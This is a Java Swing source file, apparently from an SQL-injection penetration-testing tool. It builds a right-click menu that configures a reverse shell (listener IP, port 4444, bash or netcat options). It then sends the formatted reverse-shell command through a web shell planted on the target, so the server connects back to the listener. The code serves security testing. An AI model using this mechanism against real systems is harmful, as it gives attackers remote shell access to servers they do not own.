package com.jsql.view.swing.terminal;

import com.jsql.model.exception.JSqlRuntimeException;
import com.jsql.util.LogLevelUtil;
import com.jsql.util.reverse.ModelReverse;
import com.jsql.view.swing.terminal.util.RadioItemPreventClose;
import com.jsql.view.swing.text.JTextFieldPlaceholder;
import com.jsql.view.swing.util.MediatorHelper;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.event.ActionEvent;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.io.IOException;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;

/**
 * Cancel every mouse click, only gives focus.
 */
public class EmptyFocusCopy implements MouseListener {

    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();

    private final AbstractExploit abstractExploit;

    public EmptyFocusCopy(AbstractExploit abstractExploit) {
        this.abstractExploit = abstractExploit;
    }

    @Override
    public void mousePressed(MouseEvent e) {
        e.consume();
        this.abstractExploit.requestFocusInWindow();
        this.abstractExploit.setCaretPosition(this.abstractExploit.getDocument().getLength());
        if (Objects.equals(MouseEvent.BUTTON2, e.getButton())) {
            this.pasteClipboard();
        } else if (
            Objects.equals(MouseEvent.BUTTON3, e.getButton())
            && !(this.abstractExploit instanceof ExploitSql)
            && !(this.abstractExploit instanceof ExploitReverseShell)
        ) {
            this.showMenu(e);
        }
    }

    private void pasteClipboard() {
        try {
            String data = (String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
            this.abstractExploit.append(data);
        } catch (UnsupportedFlavorException | IOException ex) {
            throw new JSqlRuntimeException(ex);
        }
    }

    private void showMenu(MouseEvent e) {
        JPopupMenu menuReverse = new JPopupMenu();

        var panelReverseShell = new JPanel(new BorderLayout());
        panelReverseShell.add(new JLabel("<html><b>Reverse shell</b></html>"));
        menuReverse.add(panelReverseShell);

        var menuListen = new JMenu("Listen");
        var menuSetting = new JMenu("Configure");
        var panelPublicAddress = new JPanel(new BorderLayout());
        panelPublicAddress.add(new JLabel("<html><b>Your public address (listener) :</b></html>"));
        menuSetting.add(panelPublicAddress);
        menuSetting.add(new JSeparator());
        var address = new JTextFieldPlaceholder("Local IP/domain", "10.0.2.2");
        menuSetting.add(address);
        var port = new JTextFieldPlaceholder("Local port", "4444");
        menuSetting.add(port);

        var panelServerConnection = new JPanel(new BorderLayout());
        panelServerConnection.add(new JLabel("<html><b>Server method (connector) :</b></html>"));
        menuSetting.add(panelServerConnection);
        menuSetting.add(new JSeparator());
        menuListen.add(menuSetting);
        var buttonGroup = new ButtonGroup();

        List<ModelReverse> commandsReverse = MediatorHelper.model().getMediatorUtils().getPreferencesUtil().getCommandsReverse();
        commandsReverse.forEach(modelReverse -> {
            var radio = new RadioItemPreventClose(modelReverse.getName());
            radio.setActionCommand(modelReverse.getName());
            radio.setSelected("bash".equals(modelReverse.getName()));
            buttonGroup.add(radio);
            menuSetting.add(radio);
        });

        Runnable runnableReverse = () -> {
            try {
                Thread.sleep(2500);
                MediatorHelper.model().getMediatorUtils().getPreferencesUtil().getCommandsReverse().stream()
                    .filter(modelReverse -> modelReverse.getName().equals(buttonGroup.getSelection().getActionCommand()))
                    .findFirst()
                    .ifPresent(modelReverse -> {
                        // TODO mysql UDF, pg Program/Extension/Archive, sqlite
                        MediatorHelper.model().getResourceAccess().runWebShell(
                            String.format(modelReverse.getCommand(), address.getText(), port.getText()),
                            null,  // ignore connection response
                            this.abstractExploit.getUrlShell(),
                            true
                        );
                    });
            } catch (InterruptedException ex) {
                LOGGER.log(LogLevelUtil.CONSOLE_JAVA, ex);
            }
        };

        var panelOpenIn = new JPanel(new BorderLayout());
        panelOpenIn.add(new JLabel("<html><b>Open In :</b></html>"));
        menuSetting.add(panelOpenIn);
        menuSetting.add(new JSeparator());

        var menuBuiltInShell = new RadioItemPreventClose("Built-in shell", true);
        var menuExternalShell = new RadioItemPreventClose("External listening shell");
        var buttonTypeShell = new ButtonGroup();
        buttonTypeShell.add(menuBuiltInShell);
        buttonTypeShell.add(menuExternalShell);
        menuSetting.add(menuBuiltInShell);
        menuSetting.add(menuExternalShell);
        var menuCreate = new JMenuItem(new AbstractAction("Create") {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (menuBuiltInShell.isSelected()) {
                    SwingUtilities.invokeLater(() -> MediatorHelper.tabResults().addTabExploitReverseShell(port.getText()));
                }
                new Thread(runnableReverse).start();
            }
        });
        menuListen.add(new JSeparator());
        menuListen.add(menuCreate);

        var menuConnect = new JMenu("Connect");
        var panelServerPublicAddress = new JPanel(new BorderLayout());
        panelServerPublicAddress.add(new JLabel("<html><b>Server public address (listener) :</b></html>"));
        menuConnect.add(panelServerPublicAddress);
        menuConnect.add(new JSeparator());
        menuConnect.add(new JTextFieldPlaceholder("Target IP/domain"));
        menuConnect.add(new JTextFieldPlaceholder("Target port"));
        menuConnect.add(new JSeparator());

        var panelServerListeningConnection = new JPanel(new BorderLayout());
        panelServerListeningConnection.add(new JLabel("<html><b>Server listening method :</b></html>"));
        menuConnect.add(panelServerListeningConnection);
        var buttonGroupListening = new ButtonGroup();
        Arrays.asList("netcat").forEach(method -> {
            var radio = new JRadioButtonMenuItem(method) {
                @Override
                protected void processMouseEvent(MouseEvent evt) {
                    if (evt.getID() == MouseEvent.MOUSE_RELEASED && this.contains(evt.getPoint())) {
                        this.doClick();
                        this.setArmed(true);
                    } else {
                        super.processMouseEvent(evt);
                    }
                }
            };
            radio.setSelected("netcat".equals(method));
            buttonGroupListening.add(radio);
            menuConnect.add(radio);
        });
        menuConnect.add(new JSeparator());
        menuConnect.add(new JMenuItem("Create"));

        menuReverse.add(new JSeparator());
        menuReverse.add(menuListen);
        menuReverse.add(menuConnect);

        menuReverse.show(MediatorHelper.frame(), e.getLocationOnScreen().x, e.getLocationOnScreen().y);
        menuReverse.setLocation(e.getLocationOnScreen());
    }

    @Override
    public void mouseReleased(MouseEvent e) {
        e.consume();
    }
    
    @Override
    public void mouseExited(MouseEvent e) {
        e.consume();
    }
    
    @Override
    public void mouseEntered(MouseEvent e) {
        e.consume();
    }
    
    @Override
    public void mouseClicked(MouseEvent e) {
        e.consume();
    }
}